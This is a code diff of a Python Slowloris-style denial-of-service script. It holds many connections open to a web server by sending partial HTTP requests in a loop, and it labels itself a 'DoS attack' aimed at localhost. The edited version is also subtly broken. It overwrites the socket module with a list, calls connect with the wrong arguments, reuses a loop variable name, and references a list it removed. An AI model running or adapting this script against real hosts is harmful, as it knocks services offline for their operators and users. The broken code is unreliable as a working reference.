@@ -2,41 +2,41 @@
 
 import socket, random, time, sys
 
-headers = [
+
+# HTTP Request messages
+header = [
     "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
     "Accept-language: en-US,en"
 ]
 
-sockets = []
+socket = []
 
-def setupSocket(host):
+def socketInitialization(host):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.settimeout(4)
-    sock.connect((host, 80))
+    sock.connect(host, 80)
     sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1337)).encode("utf-8"))
 
-    for header in headers:
+    for header in header:
         sock.send("{}\r\n".format(header).encode("utf-8"))
 
-    return sock
+    return  sock
+
 
 if __name__ == "__main__":
-    # if len(sys.argv) != 2:
-    #     print("Use it like this: python {} example.com".format(sys.argv[0]))
-    #     sys.exit()
 
-    host = 'localhost'
+    host = "localhost"
     count = 200
-    print("Starting DoS attack on {}. Connecting to {} sockets.".format(host, count))
+
+    print("Starting DoS Attack on {}. Connecting to {} socket".format(host, count))
 
     for _ in range(count):
         try:
             print("Socket {}".format(_))
-            sock = setupSocket(host)
+            sock = socketInitialization(host)
         except socket.error:
             break
-
-        sockets.append(sock)
+        socket.append(sock)
 
     while True:
         print("Connected to {} sockets. Sending headers...".format(len(sockets)))
@@ -57,3 +57,4 @@ if __name__ == "__main__":
                 break
 
         time.sleep(15)
+
